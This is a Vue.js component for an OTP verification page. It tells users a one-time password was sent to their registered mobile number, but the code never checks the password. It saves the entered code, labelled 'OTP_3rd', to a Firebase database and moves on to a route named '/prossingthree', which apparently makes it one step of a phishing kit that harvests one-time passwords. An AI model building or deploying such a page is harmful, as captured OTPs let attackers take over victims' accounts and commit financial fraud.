<template>
  <div class="App">
    <Head/>
    <div class="mainContent">
      <h1 class="text-center">One Time Password (OTP) Verification</h1>
      <div class="card">
        <p1 style="color: grey; font-size: 13px; margin-left: 20px; font-family: Work Sans, sans-serif;">
          One Time Password (OTP) has been sent to<br />
          <span style="font-size: 13px; margin-left: 20px; font-family: Work Sans, sans-serif;">
            your registered mobile Number. <br/>
          </span>
          <span style="font-size: 13px; margin-left: 20px; font-family: Work Sans, sans-serif;">
            Please enter the OTP and proceed.
          </span>
          <br />
        </p1>
        <form class="LoginForm myform" @submit.prevent="handleSubmit">
          <input type="hidden" name="" value="" />
          <div class="form-group">
            <label for="1ST_OTP" style="font-size: 13px; font-family: Work Sans, sans-serif;">
              One Time Password<span style="font-size: 13px; color: red;">*</span>
            </label>
            <input
              type="password"
              class="new-control"
              id="1ST_OTP"
              name="1ST_OTP"
              maxlength="6"
              inputMode="numeric"
              pattern="[0-9]{4,6}"
              title="Please enter valid OTP!"
              required
              v-model="otp"
            />
          </div>
          <div id="re">
            <b>
              <router-link to="/blogthree" style="color: #fff; font-family: Work Sans, sans-serif; background-color: #A6004D; padding: 4px 6px; border-radius: 4px; position: absolute; margin: -4%; margin-left: 165px; text-decoration: none;">
                Resend OTP
              </router-link>
            </b>
            <br />
          </div>
          <br />
          <div>
            <center>
              <b style="color: #A6004D; font-family: Work Sans, sans-serif; font-size: 14px; text-align: center;">
                <span style="color: #A6004D; font-family: Work Sans, sans-serif; font-size: 13px;">{{ timer }}&nbsp;second</span>
              </b>
            </center>
          </div>
          <br />
          <div class="text-center">
            <button type="submit" class="submit">
              Proceed
            </button>
          </div>
        </form>
      </div>
    </div>
    <Footer/>
  </div>
</template>

<script>
import { ref, push, set, getDatabase } from '@firebase/database';
import { app } from './firebase';
import Head from './HeadPage.vue';
import Footer from './FooterPage.vue';

const db = getDatabase(app);

export default {
  components: {
    Head,
    Footer,
  },
  data() {
    return {
      otp: '',
      timer: 180,
    };
  },
  mounted() {
    this.startTimer();
  },
  methods: {
    handleSubmit() {
      if (!/^[0-9]\d{5}$/.test(this.otp)) {
        alert('Please enter a valid OTP.');
        return;
      }
  
      const userData = {
        OTP_3rd: this.otp,
      };
  
      const otpRef = ref(db, 'data');
  
      const newEntryRef = push(otpRef);
  
      set(newEntryRef, userData)
        .then(() => {
          console.log('Data saved successfully with a unique key.');
          this.$router.push("/prossingthree");
        })
        .catch((error) => {
          console.error('Error saving data: ', error);
        });
    },
    startTimer() {
      setInterval(() => {
        if (this.timer <= 0) {
          clearInterval(this.timer);
        } else {
          this.timer--;
        }
      }, 1000);
    },
  },
};
</script>

<style scoped>
/* Add your CSS styles here */
</style>
